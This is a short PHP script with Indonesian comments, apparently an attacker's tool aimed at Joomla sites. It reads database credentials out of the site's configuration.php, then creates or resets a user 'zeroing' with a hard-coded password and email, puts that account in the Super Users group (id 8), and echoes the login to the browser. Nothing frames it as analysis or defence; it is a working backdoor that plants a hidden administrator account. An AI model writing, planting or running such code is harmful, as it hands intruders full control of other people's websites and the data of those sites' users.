<?php
// FIXED VERSION - BISA DIEKSEKUSI
error_reporting(E_ALL);
ini_set('display_errors', 1);

$config_path = $_SERVER['DOCUMENT_ROOT'] . '/configuration.php';

if (!file_exists($config_path)) {
    die('Configuration file not found');
}

// === FIX: BACA FILE SEBAGAI TEKS DAN EKSTRAK ===
$config_content = file_get_contents($config_path);

// Extract database config
preg_match('/public \$host = \'([^\']+)\'/', $config_content, $host_match);
preg_match('/public \$user = \'([^\']+)\'/', $config_content, $user_match);
preg_match('/public \$password = \'([^\']+)\'/', $config_content, $pass_match);
preg_match('/public \$db = \'([^\']+)\'/', $config_content, $db_match);
preg_match('/public \$dbprefix = \'([^\']+)\'/', $config_content, $prefix_match);

$host = $host_match[1] ?? 'localhost';
$user = $user_match[1] ?? '';
$password = $pass_match[1] ?? '';
$db = $db_match[1] ?? '';
$dbprefix = $prefix_match[1] ?? 'jos_';

// Validasi
if (empty($user) || empty($password) || empty($db)) {
    die('Could not extract database credentials');
}

// Konfigurasi user
$username = 'zeroing';
$password_user = 'Kakekterbang07#';
$email = 'askurmom007@proton.me';
$name = 'Staff';

// Koneksi database
$conn = @mysqli_connect($host, $user, $password, $db);
if (!$conn) {
    die('Database connection failed: ' . mysqli_connect_error());
}

// Cek user
$checkUser = "SELECT id FROM {$dbprefix}users WHERE username = '$username'";
$resultUser = @mysqli_query($conn, $checkUser);

if (mysqli_num_rows($resultUser) > 0) {
    // User sudah ada
    $row = mysqli_fetch_assoc($resultUser);
    $userId = $row['id'];
    
    $hashed_password = md5($password_user);
    $updatePass = "UPDATE {$dbprefix}users SET password = '$hashed_password' WHERE id = $userId";
    @mysqli_query($conn, $updatePass);
    
    $checkGroup = "SELECT * FROM {$dbprefix}user_usergroup_map WHERE user_id = $userId AND group_id = 8";
    if (mysqli_num_rows(@mysqli_query($conn, $checkGroup)) == 0) {
        $insertGroup = "INSERT INTO {$dbprefix}user_usergroup_map (user_id, group_id) VALUES ($userId, 8)";
        @mysqli_query($conn, $insertGroup);
    }
    
    echo "✅ User sudah ada! Password diupdate.<br>";
    echo "Username: $username<br>";
    echo "Password: $password_user<br>";
    
} else {
    // User baru
    $hashed_password = md5($password_user);
    $insertUser = "INSERT INTO {$dbprefix}users 
                   (name, username, email, password, block, registerDate, params) 
                   VALUES ('$name', '$username', '$email', '$hashed_password', 0, NOW(), '')";
    
    if (@mysqli_query($conn, $insertUser)) {
        $userId = mysqli_insert_id($conn);
        
        $insertGroup = "INSERT INTO {$dbprefix}user_usergroup_map (user_id, group_id) 
                        VALUES ($userId, 8)";
        @mysqli_query($conn, $insertGroup);
        
        echo "✅ User baru berhasil dibuat!<br>";
        echo "Username: $username<br>";
        echo "Password: $password_user<br>";
    } else {
        echo "❌ Gagal membuat user: " . mysqli_error($conn);
    }
}

mysqli_close($conn);
?>
